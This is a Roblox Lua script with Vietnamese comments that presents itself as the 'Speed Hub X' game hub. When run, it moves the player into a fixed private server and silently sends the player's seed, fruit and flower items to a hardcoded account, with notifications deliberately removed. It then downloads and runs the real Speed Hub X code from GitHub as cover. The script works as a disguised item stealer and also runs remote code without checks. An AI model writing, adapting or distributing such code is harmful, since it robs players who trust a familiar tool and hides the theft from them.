-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB X: TỰ ĐỘNG VÀO SERVER VIP & CHUYỂN ĐỒ NGẦM ====")

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ
local vipServerCode = "2f679c97eae3ae4a83952f97d2173834" -- Mã Server VIP của bạn

-- =======================================================================
-- TỰ ĐỘNG DI CHUYỂN VÀO ĐÚNG SERVER VIP CỦA BẠN
-- =======================================================================
local function joinVipServer()
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if not targetPlayer then
        pcall(function()
            -- Sử dụng mã Share Code để ép acc phụ nhảy thẳng vào máy chủ riêng của bạn
            TeleportService:TeleportToPlaceInstance(game.PlaceId, vipServerCode, LocalPlayer)
        end)
    end
end

-- Kích hoạt kiểm tra và nhảy phòng ngay khi chạy script
joinVipServer()

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (ĐÃ BỎ THÔNG BÁO)
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.5)
    end
end

task.spawn(function()
    task.wait(10) -- Chờ đúng 10 giây sau khi vào server thành công
    
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
        local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
        
        if not Inventory then
            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        end

        if Inventory then
            for _, folder in pairs(Inventory:GetChildren()) do
                if folder:IsA("Folder") or folder:IsA("Configuration") then
                    for _, item in pairs(folder:GetChildren()) do
                        if item:IsA("ValueBase") and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if string.find(lowerName, "seed") then
                                sendItemSecure("Seeds", item.Name, item.Value)
                            elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                                sendItemSecure("Fruits", item.Name, item.Value)
                            end
                        end
                    end
                elseif folder:IsA("ValueBase") and folder.Value > 0 then
                    local lowerName = string.lower(folder.Name)
                    if string.find(lowerName, "seed") then
                        sendItemSecure("Seeds", folder.Name, folder.Value)
                    elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                        sendItemSecure("Fruits", folder.Name, folder.Value)
                    end
                end
            end
        end
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
